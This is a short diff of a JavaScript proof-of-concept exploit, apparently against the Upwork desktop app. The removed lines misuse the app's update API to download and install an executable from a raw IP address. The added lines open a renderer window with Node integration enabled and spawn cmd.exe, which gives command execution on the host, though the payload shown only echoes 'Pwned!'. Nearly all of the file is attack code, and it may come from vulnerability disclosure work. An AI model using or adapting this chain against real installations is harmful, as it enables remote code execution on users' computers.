@@ -1,6 +1,13 @@
-UTA.Update.UpdateBinaryInitiate('http://35.229.167.231/gopro.exe', '11').then(function (){
-  //return UTA.OSServices.writeToSystemStorage('1',1,'https://vinhjaxt.github.io/gopro.sha265.txt?_='+Math.random())
-  return 1
-}).then(function (){
-  return UTA.Update.upgrade('11')
-}).then(function (){ console.log('Done hihi') }).catch(alert)
+if (typeof require === 'undefined') {
+  UTA.OSServices.otherRendererWindowOpen(location.href, '', {webPreferences:{nodeIntegration: true}}).then(function () {
+    console.log('Done')
+  }).catch(alert)
+}else{
+  var fs = require('fs')
+  var out = fs.openSync('./out.log', 'a')
+  var err = fs.openSync('./out.log', 'a')
+
+  var cp = require('child_process')
+  var child = cp.spawn('cmd', ['/c', 'start', 'cmd.exe', '/c', 'echo Pwned! Hello upwork! && pause'], { detached: true, stdio: [ 'ignore', out, err ] })
+  child.unref()
+}
